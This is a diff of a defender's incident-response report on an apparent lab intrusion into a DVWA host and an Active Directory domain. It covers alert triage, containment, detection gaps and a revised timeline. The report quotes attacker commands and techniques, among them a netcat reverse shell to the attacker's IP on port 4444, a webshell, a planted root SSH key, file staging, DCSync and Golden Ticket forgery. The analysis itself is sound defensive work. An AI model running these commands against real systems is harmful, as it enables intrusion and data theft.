@@ -167,9 +167,9 @@ On DVWA, the attacker established **three independent ways in**. If I only delet
 
 ### What I am executing on DVWA:
 
-- **Remove Root SSH Persistence (#16):** Copy `/root/.ssh/authorized_keys` to `/root/forensics_authorized_keys.bak` (preserving metadata/timestamps for Case 01), then delete the line containing `ED25519 SHA256:sMGVpOuqXdgB9Cqa5JCKAmoz51G5mwbkEUAxSngg4hE`.
+- **Remove Root SSH Persistence (#16):** Copy `/root/.ssh/authorized_keys` to `/root/forensics_quarantine/authorized_keys.bak` (preserving metadata/timestamps for Case 01), then delete the line containing `ED25519 SHA256:sMGVpOuqXdgB9Cqa5JCKAmoz51G5mwbkEUAxSngg4hE`.
 - **Kill Active Attacker Processes (#14 – #15):** Terminate any active `sshd: root@...` sessions from `192.168.232.135` (such as port 36488), kill any `/usr/bin/nc.openbsd` (`nc 192.168.232.135 4444`) or `/bin/sh -i` processes, and remove the named pipe `rm -f /tmp/f`.
-- **Quarantine the Webshell (#11):** Move `/var/www/html/hackable/uploads/shell.php` out of the web root to `/root/forensics_shell.php.quarantine` (`chmod 000`) so Apache (www-data) can no longer execute `?cmd=` requests.
+- **Quarantine the Webshell (#11):** Move `/var/www/html/dvwa/hackable/uploads/shell.php` out of the web root to `/root/forensics_quarantine/shell.php.quarantined` (`chmod 000`) so Apache (www-data) can no longer execute `?cmd=` requests.
 
 ## 🛡️ Action 3: Disable AD\backdoor, Strip Its Admin Groups & Twice-Reset krbtgt on DomainWin10 (192.168.56.10)
 
@@ -282,8 +282,8 @@ Restrict T1047 strictly to Windows events where `parentImage` / `parentProcessNa
 
 ### What went wrong:
 
-- **Zero alerts fired during the 5m 40s Linux privilege escalation gap** (`17:24:03 – 17:29:43 IST`) where www-data escalated to root and wrote `/root/.ssh/authorized_keys`
-- **Zero Suricata alerts fired when DVWA first connected to PC-DC:445** to launch wmiexec.py at `18:04:47 IST`
+- **Zero TheHive alerts fired during the 5m 40s Linux privilege escalation window** (17:24:03 - 17:29:43 IST): While Wazuh Agent and Auditd actively logged stty sane, sudo -l, PAM sudo execution (Rule 5402), and SSH key manipulation, these rules were classified below Level 8 (Level 3-5), meaning they were dropped by the TheHive forwarding gate and produced zero SOC alerts for human analysts until SSH login (#16).
+- **Zero Suricata alerts fired when DVWA first connected to PC-DC:445** to launch wmiexec.py at 18:04:47 IST (lack of lateral SMB RPC anomalous inspection between internal subnets).
 
 ### How to fix it:
 
@@ -449,7 +449,7 @@ Simultaneously, Alert #14 logs 5 packets across the active TCP connection `192.1
 ![Alert #15: DVWA Host auditd Netcat Execution](../assets/screenshots/investigation/initial-triage/slot_05_alert15_auditd_netcat_reverse_shell.png)
 *Figure 5b: Alert #15 detail showing Linux auditd logging /usr/bin/nc.openbsd spawning an interactive shell via mkfifo /tmp/f.*
 
-Then, after a **5-minute, 40-second unlogged gap** (`17:24:03` to `17:29:43 IST`), Alert #16 (Wazuh rule `5715`) fires with 2 succeeded attempts and 0 failed password attempts. The raw sshd log reads:
+Then, after a **5-minute, 40-second SOAR queue gap** (`17:24:03` to `17:29:43 IST` — during which host-level Auditd and PAM sudo Rule 5402 logs were recorded locally by Wazuh but fell below TheHive's Level >= 8 forwarding gate), Alert #16 (Wazuh rule `5715`) fires with 2 succeeded attempts and 0 failed password attempts. The raw sshd log reads:
 
 ```log
 2026-10-18T17:29:43.576530+05:30 dvwa sshd[17711]: Accepted publickey for root from 192.168.232.135 port 36488 ssh2: ED25519 SHA256:sMGVpOuqXdgB9Cqa5JCKAmoz51G5mwbkEUAxSngg4hE
@@ -503,6 +503,11 @@ However, what I don't have in this alert is the actual Kerberos packet payload s
 
 ![Alert #23: Suricata GoldenPac Kerberos Flow](../assets/screenshots/investigation/initial-triage/slot_06.5_alert23_goldenpac_kerberos_traffic.png)
 *Figure 6.5: Alert #23 detail showing ET EXPLOIT Possible GoldenPac Priv Esc in-use on flow 192.168.56.30:33986 -> 192.168.56.10:88.*
+
+> [!NOTE]
+> **Host Correlation & Root Cause of Alert #23 (Kerberoasting vs. GoldenPac):**  
+> During initial queue triage of the 46 TheHive alerts, Suricata's signature `ET EXPLOIT Possible GoldenPac Priv Esc in-use` at `18:01:18 IST` naturally flagged this traffic as suspected MS14-068.  
+> However, subsequent host log correlation in [Deep-Dive-Attack-Chain-Investigation.md](Deep-Dive-Attack-Chain-Investigation.md#phase-5-becoming-god-in-active-directory-kerberoasting-dcsync--the-golden-ticket) (Row 9264 of `Wazuh-Raw-Alerts.csv`) confirms that at `18:01:18 IST`, the attacker executed `GetUserSPNs.py` (Stage 13 Kerberoasting against `HANK_SHERMAN`), which triggered Suricata's port 88 heuristic signature. The attacker then executed DCSync at `18:02:43 IST` (`secretsdump.py`), and forged the true enterprise Golden Ticket at `18:06:40 IST` via `ticketer.py` (Row 9306) using the dumped `krbtgt` hash (`...f4e05f60`).
 
 ### ✅ Window 3 Verdict & Real Priority
 
@@ -640,6 +645,10 @@ cmd /c "type C:\Users\win10\Documents\Sensitive\* > C:\Windows\Temp\sensitive_da
 
 ![Alert #38: Repeated Root SSH Reconnects on DVWA](../assets/screenshots/investigation/initial-triage/slot_09.5_alert38_root_ssh_reconnect.png)
 *Figure 9.5: Alert #38 detail showing accepted publickey logins for root on DVWA prior to the destructive impact sequence.*
+
+> [!NOTE]
+> **Host Telemetry Correlation on Alert #37 (SCP Exfiltration Burst):**  
+> While sshd logs alone do not log an explicit `scp` subsystem identifier (leading an L1 triage analyst to cautiously read #37 as interactive re-connections), host-level bash auditing ([Deep-Dive Phase 6](Deep-Dive-Attack-Chain-Investigation.md#phase-6-backdoors--smuggling-domain-persistence--rapid-exfiltration), `wzb-52` & `wzb-53`) proves that at `18:17:09 IST` (Row 9393), the attacker verified `ls /tmp/domain_users.txt /tmp/admin_info.txt /tmp/sensitive_data.txt` on DVWA, immediately followed at `18:17:30 IST` by an automated SCP script opening 6 rapid parallel SSH connections to download the three staged files to Kali Linux. Alert #37 represents the Stage 19 automated exfiltration burst.
 
 ### ✅ Window 5 Verdict & Real Priority
 
